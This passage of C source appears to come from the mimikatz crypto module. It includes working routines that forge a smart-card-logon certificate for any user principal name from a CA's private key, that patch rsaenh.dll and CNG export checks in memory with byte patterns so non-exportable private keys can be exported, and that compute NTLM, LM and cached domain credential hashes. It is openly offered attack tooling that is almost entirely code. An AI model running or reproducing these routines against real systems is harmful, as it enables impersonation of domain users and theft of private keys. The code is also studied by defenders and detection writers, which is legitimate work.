		status = SCardListReaders(hContext, SCARD_ALL_READERS, (LPWSTR) &mszReaders, &dwLen);
		if(status == SCARD_S_SUCCESS)
		{
			kprintf(L"SmartCard readers:\n");
			for(pReader = mszReaders; *pReader; pReader += wcslen(pReader) + 1)
			{
				kprintf(L"\n * %s\n", pReader);
				status = SCardConnect(hContext, pReader, SCARD_SHARE_SHARED, SCARD_PROTOCOL_T0 | SCARD_PROTOCOL_T1, &hCard, &dwActiveProtocol);
				if(status == SCARD_S_SUCCESS)
				{
					dwLen = sizeof(atr);
					status = SCardGetAttrib(hCard, SCARD_ATTR_ATR_STRING, atr, &dwLen);
					if(status == SCARD_S_SUCCESS)
					{
						kprintf(L"    ATR  : ");
						kull_m_string_wprintf_hex(atr, sizeof(atr), 0);
						kprintf(L"\n");

						dwLen = SCARD_AUTOALLOCATE;
						status = SCardListCards(hContext, atr, NULL, 0, (LPWSTR) &mszCards, &dwLen);
						if(status == SCARD_S_SUCCESS)
						{
							for(pCard = mszCards; *pCard; pCard += wcslen(pCard) + 1)
							{
								kprintf(L"    Model: %s\n", pCard);
								dwLen = SCARD_AUTOALLOCATE;
								status = SCardGetCardTypeProviderName(hContext, pCard, SCARD_PROVIDER_CSP, (LPWSTR) &szProvider, &dwLen);
								if(status == SCARD_S_SUCCESS)
								{
									kprintf(L"    CSP  : %s\n", szProvider);
									if(dwProvType = kuhl_m_crypto_l_sc_provtypefromname(szProvider))
									{
										if(szContainer = kuhl_m_crypto_l_sc_containerFromReader(pReader))
										{
											kuhl_m_crypto_l_keys_capi(szContainer, szProvider, dwProvType, CRYPT_SILENT, FALSE, NULL);
											LocalFree(szContainer);
										}
									}
									SCardFreeMemory(hContext, szProvider);
								}
								else PRINT_ERROR(L"SCardGetCardTypeProviderName: 0x%08x\n", status);
							}
							SCardFreeMemory(hContext, mszCards);
						}
						else PRINT_ERROR(L"SCardListCards: 0x%08x\n", status);
					}
					else PRINT_ERROR(L"SCardGetAttrib: 0x%08x\n", status);
					SCardDisconnect(hCard, SCARD_LEAVE_CARD);
				}
				else if(status != SCARD_W_REMOVED_CARD)
					PRINT_ERROR(L"SCardConnect: 0x%08x\n", status);
			}
			SCardFreeMemory(hContext, mszReaders);
		}
		else PRINT_ERROR(L"SCardListReaders: 0x%08x\n", status);
		SCardReleaseContext(hContext);
	}
	else PRINT_ERROR(L"SCardEstablishContext: 0x%08x\n", status);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_hash(int argc, wchar_t * argv[])
{
	PCWCHAR szCount, szPassword = NULL, szUsername = NULL;
	UNICODE_STRING uPassword, uUsername, uTmp;
	ANSI_STRING aTmp;
	DWORD count = 10240;
	BYTE hash[LM_NTLM_HASH_LENGTH], dcc[LM_NTLM_HASH_LENGTH], md5[MD5_DIGEST_LENGTH], sha1[SHA_DIGEST_LENGTH], sha2[32];
	
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
	kull_m_string_args_byName(argc, argv, L"user", &szUsername, NULL);
	if(kull_m_string_args_byName(argc, argv, L"count", &szCount, NULL))
		count = wcstoul(szCount, NULL, 0);

	RtlInitUnicodeString(&uPassword, szPassword);
	RtlInitUnicodeString(&uUsername, szUsername);
	if(NT_SUCCESS(RtlDigestNTLM(&uPassword, hash)))
	{
		kprintf(L"NTLM: "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
		if(szUsername)
		{
			if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, 0)))
			{
				kprintf(L"DCC1: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
				if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, count)))
				{
					kprintf(L"DCC2: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
				}
			}
		}
	}

	if(NT_SUCCESS(RtlUpcaseUnicodeString(&uTmp, &uPassword, TRUE)))
	{
		if(NT_SUCCESS(RtlUnicodeStringToAnsiString(&aTmp, &uTmp, TRUE)))
		{
			if(NT_SUCCESS(RtlDigestLM(aTmp.Buffer, hash)))
			{
				kprintf(L"LM  : "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
			}
			RtlFreeAnsiString(&aTmp);
		}
		RtlFreeUnicodeString(&uTmp);
	}

	if(kull_m_crypto_hash(CALG_MD5, uPassword.Buffer, uPassword.Length, md5, MD5_DIGEST_LENGTH))
		kprintf(L"MD5 : "); kull_m_string_wprintf_hex(md5, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(kull_m_crypto_hash(CALG_SHA1, uPassword.Buffer, uPassword.Length, sha1, SHA_DIGEST_LENGTH))
		kprintf(L"SHA1: "); kull_m_string_wprintf_hex(sha1, SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(kull_m_crypto_hash(CALG_SHA_256, uPassword.Buffer, uPassword.Length, sha2, 32))
		kprintf(L"SHA2: "); kull_m_string_wprintf_hex(sha2, 32, 0); kprintf(L"\n");

	return STATUS_SUCCESS;
}

BOOL kuhl_m_crypto_system_data(PBYTE data, DWORD len, PCWCHAR originalName, BOOL isExport)
{
	BOOL status = FALSE;
	PCWCHAR name;
	PKUHL_M_CRYPTO_CERT_PROP prop;
	PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO provInfo;

	for(prop = (PKUHL_M_CRYPTO_CERT_PROP) data; (PBYTE) prop < (data + len); prop = (PKUHL_M_CRYPTO_CERT_PROP) ((PBYTE) prop + FIELD_OFFSET(KUHL_M_CRYPTO_CERT_PROP, data) + prop->size))
	{
		name = kull_m_crypto_cert_prop_id_to_name(prop->dwPropId);
		kprintf(L"[%04x/%x] %s\n", prop->dwPropId, prop->flags, name ? name : L"?");
		if(prop->size)
		{
			kprintf(L"  ");
			switch(prop->dwPropId)
			{
			case CERT_KEY_PROV_INFO_PROP_ID:
				kprintf(L"Provider info:\n");
				provInfo = (PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO) prop->data;
				if(provInfo->offsetContainerName)
					kprintf(L"\tKey Container  : %s\n", prop->data + provInfo->offsetContainerName);
				if(provInfo->offsetProvName)
					kprintf(L"\tProvider       : %s\n", prop->data + provInfo->offsetProvName);
				name = kull_m_crypto_provider_type_to_name(provInfo->dwProvType);
				kprintf(L"\tProvider type  : %s (%u)\n", name ? name : L"?", provInfo->dwProvType);
				kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(provInfo->dwKeySpec), provInfo->dwKeySpec);
				kprintf(L"\tFlags          : %08x\n", provInfo->dwFlags);
				kprintf(L"\tParam (todo)   : %08x / %08x\n", provInfo->cProvParam, provInfo->offsetRgProvParam);
				break;
			case CERT_FRIENDLY_NAME_PROP_ID:
			case CERT_OCSP_CACHE_PREFIX_PROP_ID:
			case 101: //CERT_SMART_CARD_READER_PROP_ID
				kprintf(L"%.*s", prop->size / sizeof(wchar_t), prop->data);
				break;
			case CERT_cert_file_element:
			case CERT_crl_file_element:
			case CERT_ctl_file_element:
			case CERT_keyid_file_element:
				kuhl_m_crypto_file_rawData(prop, originalName, isExport);
				break;
			case CERT_SHA1_HASH_PROP_ID:
			case CERT_MD5_HASH_PROP_ID :
			case CERT_SIGNATURE_HASH_PROP_ID:
			case CERT_ISSUER_PUBLIC_KEY_MD5_HASH_PROP_ID:
			case CERT_SUBJECT_PUBLIC_KEY_MD5_HASH_PROP_ID:
			case CERT_ISSUER_SERIAL_NUMBER_MD5_HASH_PROP_ID:
			case CERT_SUBJECT_NAME_MD5_HASH_PROP_ID:
			case CERT_KEY_IDENTIFIER_PROP_ID:
				//
			default:
				kull_m_string_wprintf_hex(prop->data, prop->size, 0);
				break;
			}
			kprintf(L"\n");
		}
	}

	return status;
}

BOOL CALLBACK kuhl_m_crypto_system_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	PBYTE fileData;
	DWORD fileLenght;
	if(fullpath)
	{
		kprintf(L"\n* File: \'%s\'\n", fullpath);
		if(kull_m_file_readData(fullpath, &fileData, &fileLenght))
		{
			kuhl_m_crypto_system_data(fileData, fileLenght, fullpath, *(PBOOL) pvArg);
			LocalFree(fileData);
		}
	}
	return TRUE;
}

NTSTATUS kuhl_m_crypto_system(int argc, wchar_t * argv[])
{
	BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	PCWCHAR infile;

	if(kull_m_string_args_byName(argc, argv, L"file", &infile, NULL)) // TODO: registry & hive
	{
		if(PathIsDirectory(infile))
		{
			kprintf(L"* Directory: \'%s\'\n", infile);
			kull_m_file_Find(infile, NULL, FALSE, 0, FALSE, kuhl_m_crypto_system_directory, &isExport);
		}
		else
			kuhl_m_crypto_system_directory(0, infile, PathFindFileName(infile), &isExport);
	}
	else PRINT_ERROR(L"Input Microsoft Crypto Certificate file needed (/file:filename|directory)\n");
	return STATUS_SUCCESS;
}

void kuhl_m_crypto_file_rawData(PKUHL_M_CRYPTO_CERT_PROP prop, PCWCHAR inFile, BOOL isExport)
{
	PCWCHAR type, file = PathFindFileName(inFile);
	wchar_t * buffer;
	size_t charCount;

	switch(prop->dwPropId)
	{
	case CERT_cert_file_element:
		type = L"der";
		break;
	case CERT_crl_file_element:
		type = L"crl";
		break;
	case CERT_ctl_file_element:
		type = L"ctl";
		break;
	case CERT_keyid_file_element:
		type = L"keyid";
		break;
	default:
		type = NULL;
	}

	if(type)
	{
		kprintf(L"Data: ");
		kull_m_string_wprintf_hex(prop->data, prop->size, 0);
		kprintf(L"\n");
		if(isExport)
		{
			kprintf(L"  ");
			charCount = wcslen(file) + 1 + wcslen(type) + 1;
			if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
			{
				if(swprintf_s(buffer, charCount, L"%s.%s", file, type) > 0)
				{
					if(kull_m_file_writeData(buffer, prop->data, prop->size))
						kprintf(L"Saved to file: %s\n", buffer);
					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
				}
				LocalFree(buffer);
			}
		}
	}
}

BOOL kuhl_m_crypto_c_sc_auth_quickEncode(__in LPCSTR lpszStructType, __in const void *pvStructInfo, PDATA_BLOB data)
{
	BOOL status = FALSE;
	data->cbData = 0;
	data->pbData = NULL;
	if(CryptEncodeObject(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING, lpszStructType, pvStructInfo, NULL, &data->cbData))
	{
		if(data->pbData = (PBYTE) LocalAlloc(LPTR, data->cbData))
		{
			if(!(status = CryptEncodeObject(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING, lpszStructType, pvStructInfo, data->pbData, &data->cbData)))
			{
				PRINT_ERROR_AUTO(L"CryptEncodeObject (data)");
				LocalFree(data->pbData);
			}
		}
	}
	else PRINT_ERROR_AUTO(L"CryptEncodeObject (init)");
	return status;
}

BOOL kuhl_m_crypto_c_sc_auth_Ext_AltUPN(PCERT_EXTENSION pCertExtension, LPCWSTR upn)
{
	BOOL status = FALSE;
	CERT_NAME_VALUE otherNameValue = {CERT_RDN_UTF8_STRING, (DWORD) wcslen(upn) * sizeof(wchar_t), (PBYTE) upn};
	CERT_OTHER_NAME otherName = {szOID_NT_PRINCIPAL_NAME, {0, NULL}};
	CERT_ALT_NAME_ENTRY altName = {CERT_ALT_NAME_OTHER_NAME, &otherName};
	CERT_ALT_NAME_INFO AltName = {1, &altName};
	pCertExtension->pszObjId = szOID_SUBJECT_ALT_NAME2;
	pCertExtension->fCritical = FALSE;
	if(kuhl_m_crypto_c_sc_auth_quickEncode(X509_UNICODE_ANY_STRING, &otherNameValue, &otherName.Value))
	{
		status = kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &AltName, &pCertExtension->Value);
		LocalFree(otherName.Value.pbData);
	}
	return status;
}

BOOL kuhl_m_crypto_c_sc_auth_Ext_KU(PCERT_EXTENSION pCertExtension, WORD bits)
{
	CRYPT_BIT_BLOB bit = {sizeof(bits), (PBYTE) &bits, 5};
	pCertExtension->pszObjId = szOID_KEY_USAGE;
	pCertExtension->fCritical = TRUE;
	return kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &bit, &pCertExtension->Value);
}

BOOL kuhl_m_crypto_c_sc_auth_Ext_EKU(PCERT_EXTENSION pCertExtension, DWORD count, ...)
{
	BOOL status = FALSE;
	DWORD i;
	va_list vaList;
	CERT_ENHKEY_USAGE usage = {count, NULL};
	pCertExtension->pszObjId = szOID_ENHANCED_KEY_USAGE;
	pCertExtension->fCritical = FALSE;
	if(usage.rgpszUsageIdentifier = (LPSTR *) LocalAlloc(LPTR, sizeof(LPSTR) * count))
	{
		va_start(vaList, count); 
		for(i = 0; i < count; i++)
			usage.rgpszUsageIdentifier[i] =  va_arg(vaList, LPSTR);
		va_end(vaList);
		status = kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &usage, &pCertExtension->Value);
		LocalFree(usage.rgpszUsageIdentifier);
	}
	return status;
}

__inline void kuhl_m_crypto_c_sc_auth_Ext_Free(PCERT_EXTENSION pCertExtension)
{
	if(pCertExtension->Value.pbData)
		LocalFree(pCertExtension->Value.pbData);
}

NTSTATUS kuhl_m_crypto_c_sc_auth(int argc, wchar_t * argv[])
{
	LPCWSTR szStoreCA, szNameCA, szUPN, szPfx = NULL;
	HCERTSTORE hCertStoreCA;
	PCCERT_CONTEXT pCertCtxCA;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKeyCA;
	DWORD dwKeySpecCA;
	BOOL bToFreeCA, isExported = FALSE;

	HCRYPTPROV hProvCERT;
	HCRYPTKEY hKeyCERT;
	BYTE SerialNumber[LM_NTLM_HASH_LENGTH];
	CERT_RDN_ATTR rgNameAttr[] = {
		{szOID_COMMON_NAME, CERT_RDN_UNICODE_STRING, {0, NULL}},
		{szOID_ORGANIZATION_NAME, CERT_RDN_UNICODE_STRING, {sizeof(MIMIKATZ) - sizeof(wchar_t), (PBYTE) MIMIKATZ}},
		{szOID_COUNTRY_NAME, CERT_RDN_UNICODE_STRING, {sizeof(L"FR") - sizeof(wchar_t), (PBYTE) L"FR"}},
	};
	CERT_RDN rgRDN = {ARRAYSIZE(rgNameAttr), rgNameAttr};
	CERT_NAME_INFO Name = {1, &rgRDN};
	CERT_EXTENSION Extensions[3] = {0}; // EKU, KU, AltNames
	DWORD cbPublicKeyInfo;
	PCERT_PUBLIC_KEY_INFO pbPublicKeyInfo;
	CRYPT_KEY_PROV_INFO keyInfos = {NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_SILENT, 0, NULL, AT_KEYEXCHANGE};

	CERT_INFO CertInfo = {0};
	DWORD szCertificate = 0;
	PBYTE Certificate = NULL;

	if(keyInfos.pwszContainerName = kull_m_string_getRandomGUID())
	{
		CertInfo.dwVersion = CERT_V3;
		CertInfo.SerialNumber.cbData = sizeof(SerialNumber);
		CertInfo.SerialNumber.pbData = SerialNumber;
		CertInfo.cExtension = ARRAYSIZE(Extensions);
		CertInfo.rgExtension = Extensions;
		CDGenerateRandomBits(CertInfo.SerialNumber.pbData, CertInfo.SerialNumber.cbData);

		kull_m_string_args_byName(argc, argv, L"castore", &szStoreCA, L"LOCAL_MACHINE");
		if(kull_m_string_args_byName(argc, argv, L"caname", &szNameCA, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"upn", &szUPN, NULL))
			{
				rgNameAttr[0].Value.cbData = (DWORD) wcslen(szUPN) * sizeof(wchar_t);
				rgNameAttr[0].Value.pbData = (PBYTE) szUPN;
				kprintf(L"CA store       : %s\n", szStoreCA);
				if(hCertStoreCA = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, kull_m_crypto_system_store_to_dword(szStoreCA) | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My"))
				{
					kprintf(L"CA name        : %s\n", szNameCA);
					if(pCertCtxCA = CertFindCertificateInStore(hCertStoreCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szNameCA, NULL))
					{
						kprintf(L"CA validity    : "); kull_m_string_displayLocalFileTime(&pCertCtxCA->pCertInfo->NotBefore);
						kprintf(L" -> "); kull_m_string_displayLocalFileTime(&pCertCtxCA->pCertInfo->NotAfter); kprintf(L"\n");
						if(CryptAcquireCertificatePrivateKey(pCertCtxCA, CRYPT_ACQUIRE_CACHE_FLAG | CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG, NULL, &hKeyCA, &dwKeySpecCA, &bToFreeCA))
						{
							CertInfo.Issuer = pCertCtxCA->pCertInfo->Subject;
							CertInfo.IssuerUniqueId = pCertCtxCA->pCertInfo->SubjectUniqueId;
							CertInfo.NotBefore = pCertCtxCA->pCertInfo->NotBefore;
							CertInfo.NotAfter = pCertCtxCA->pCertInfo->NotAfter;
							CertInfo.SignatureAlgorithm = pCertCtxCA->pCertInfo->SignatureAlgorithm;
							kprintf(L"Certificate UPN: %s\n", szUPN);
							if(kuhl_m_crypto_c_sc_auth_quickEncode(X509_NAME, &Name, &CertInfo.Subject))
							{
								if(kuhl_m_crypto_c_sc_auth_Ext_EKU(&Extensions[0], 2, szOID_KP_SMARTCARD_LOGON, szOID_PKIX_KP_CLIENT_AUTH))
								{
									if(kuhl_m_crypto_c_sc_auth_Ext_KU(&Extensions[1], CERT_DIGITAL_SIGNATURE_KEY_USAGE | CERT_KEY_ENCIPHERMENT_KEY_USAGE))
									{
										if(kuhl_m_crypto_c_sc_auth_Ext_AltUPN(&Extensions[2], szUPN))
										{
											kprintf(L"Key container  : %s\n", keyInfos.pwszContainerName);
											kprintf(L"Key provider   : %s\n", keyInfos.pwszProvName);
											if(CryptAcquireContext(&hProvCERT, keyInfos.pwszContainerName, keyInfos.pwszProvName, keyInfos.dwProvType, CRYPT_NEWKEYSET | keyInfos.dwFlags))
											{
												if(CryptGenKey(hProvCERT, keyInfos.dwKeySpec, CRYPT_EXPORTABLE | (RSA1024BIT_KEY * 2), &hKeyCERT))
												{
													if(CryptExportPublicKeyInfo(hProvCERT, keyInfos.dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, NULL, &cbPublicKeyInfo))
													{
														if(pbPublicKeyInfo = (PCERT_PUBLIC_KEY_INFO) LocalAlloc(LPTR, cbPublicKeyInfo))
														{
															if(CryptExportPublicKeyInfo(hProvCERT, keyInfos.dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, pbPublicKeyInfo, &cbPublicKeyInfo))
															{
																CertInfo.SubjectPublicKeyInfo = *pbPublicKeyInfo;
																if(CryptSignAndEncodeCertificate(hKeyCA, dwKeySpecCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, X509_CERT_TO_BE_SIGNED, &CertInfo, &CertInfo.SignatureAlgorithm, NULL, NULL, &szCertificate))
																{
																	if(Certificate = (PBYTE) LocalAlloc(LPTR, szCertificate))
																	{
																		if(CryptSignAndEncodeCertificate(hKeyCA, dwKeySpecCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, X509_CERT_TO_BE_SIGNED, &CertInfo, &CertInfo.SignatureAlgorithm, NULL, Certificate, &szCertificate))
																		{
																			if(kull_m_string_args_byName(argc, argv, L"pfx", &szPfx, NULL))
																			{
																				isExported = kull_m_crypto_DerAndKeyInfoToPfx(Certificate, szCertificate, &keyInfos, szPfx);
																				kprintf(L"Private Export : %s - %s\n", szPfx, isExported ? L"OK" : L"KO");
																			}
																			else
																			{
																				isExported = kull_m_crypto_DerAndKeyInfoToStore(Certificate, szCertificate, &keyInfos, CERT_SYSTEM_STORE_CURRENT_USER, L"My", FALSE);
																				kprintf(L"Private Store  : CERT_SYSTEM_STORE_CURRENT_USER/My - %s\n", isExported ? L"OK" : L"KO");
																			}
																		}
																		else PRINT_ERROR_AUTO(L"CryptSignAndEncodeCertificate (data)");
																		LocalFree(Certificate);
																	}
																}
																else PRINT_ERROR_AUTO(L"CryptSignAndEncodeCertificate (init)");
															}
															else PRINT_ERROR_AUTO(L"CryptExportPublicKeyInfo (data)");
															LocalFree(pbPublicKeyInfo);
														}
													}
													else PRINT_ERROR_AUTO(L"CryptExportPublicKeyInfo (init)");
													CryptDestroyKey(hKeyCERT);
												}
												else PRINT_ERROR_AUTO(L"CryptGenKey");

												CryptReleaseContext(hProvCERT, 0);
												if(!isExported || szPfx)
												{
													if(!CryptAcquireContext(&hProvCERT, keyInfos.pwszContainerName, keyInfos.pwszProvName, keyInfos.dwProvType, CRYPT_DELETEKEYSET | keyInfos.dwFlags))
														PRINT_ERROR_AUTO(L"Unable to delete temp keyset");
												}
											}
											else PRINT_ERROR_AUTO(L"CryptAcquireContext");
											kuhl_m_crypto_c_sc_auth_Ext_Free(&Extensions[2]);
										}
										kuhl_m_crypto_c_sc_auth_Ext_Free(&Extensions[1]);
									}
									kuhl_m_crypto_c_sc_auth_Ext_Free(&Extensions[0]);
								}
								LocalFree(CertInfo.Subject.pbData);
							}
							CryptReleaseContext(hKeyCA, 0);
						}
						else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
						CertFreeCertificateContext(pCertCtxCA);
					}
					else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
					CertCloseStore(hCertStoreCA, CERT_CLOSE_STORE_FORCE_FLAG);
				}
				else PRINT_ERROR_AUTO(L"CertOpenStore");
			}
			else PRINT_ERROR(L"/upn:user@domain.local needed\n");
		}
		else PRINT_ERROR(L"/caname:CA-KIWI needed\n");

		LocalFree(keyInfos.pwszContainerName);
	}
	return STATUS_SUCCESS;
}

BYTE PATC_WIN5_CPExportKey_EXPORT[]	= {0xeb};
BYTE PATC_W6AL_CPExportKey_EXPORT[]	= {0x90, 0xe9};
#ifdef _M_X64
BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x75};
BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x0c, 0x0e, 0x72};
BYTE PTRN_W6AL_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x0c, 0x0e, 0x0f, 0x82};
BYTE PTRN_WIN8_CPExportKey_4000[]	= {0x0c, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
KULL_M_PATCH_GENERIC Capi4001References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-4}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W6AL_CPExportKey_4001),	PTRN_W6AL_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
};
KULL_M_PATCH_GENERIC Capi4000References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{0, NULL}, {-5}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{0, NULL}, { 2}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_CPExportKey_4000),	PTRN_WIN8_CPExportKey_4000},	{0, NULL}, { 5}},
};
#elif defined _M_IX86
BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x75};
BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x09, 0x40, 0x0f, 0x84};
BYTE PTRN_WI60_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
BYTE PTRN_WI60_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
KULL_M_PATCH_GENERIC Capi4001References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4001),	PTRN_WI60_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4001),	PTRN_WIN6_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
};
KULL_M_PATCH_GENERIC Capi4000References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{0, NULL}, {-7}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4000),	PTRN_WI60_CPExportKey_4000},	{0, NULL}, { 3}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{0, NULL}, { 5}},
};
#endif
NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
{
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleRsaEnh;
	KULL_M_MEMORY_ADDRESS
		aPattern4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPattern4001Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;
	
	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
	if(currentReference4001 && currentReference4000)
	{
		aPattern4001Memory.address = currentReference4001->Search.Pattern;
		aPattern4000Memory.address = currentReference4000->Search.Pattern;
		aPatchMemory.address = currentReference4001->Patch.Pattern;

		if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"rsaenh.dll", &iModuleRsaEnh))
		{
			sMemory.kull_m_memoryRange.size = iModuleRsaEnh.SizeOfImage - ((PBYTE) K_CPExportKey - (PBYTE) iModuleRsaEnh.DllBase.address);
		
			if(	kull_m_patch(&sMemory, &aPattern4001Memory, currentReference4001->Search.Length, &aPatchMemory, currentReference4001->Patch.Length, currentReference4001->Offsets.off0, NULL, 0, NULL, NULL)	&&
				kull_m_patch(&sMemory, &aPattern4000Memory, currentReference4000->Search.Length, &aPatchMemory, currentReference4001->Patch.Length, currentReference4000->Offsets.off0, NULL, 0, NULL, NULL)	)
				kprintf(L"Local CryptoAPI patched\n");
			else
				PRINT_ERROR_AUTO(L"kull_m_patch");

		} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
	}					
	return STATUS_SUCCESS;
}

BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb};
BYTE PATC_W10_1607_SPCryptExportKey_EXPORT[]= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
#ifdef _M_X64
BYTE PTRN_WI60_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85};
BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x43, 0x24, 0x02, 0x75};
BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x46, 0x24, 0x02, 0x75};
BYTE PTRN_W10_1607_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x02, 0x0f, 0x84};
BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
KULL_M_PATCH_GENERIC CngReferences[] = {
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
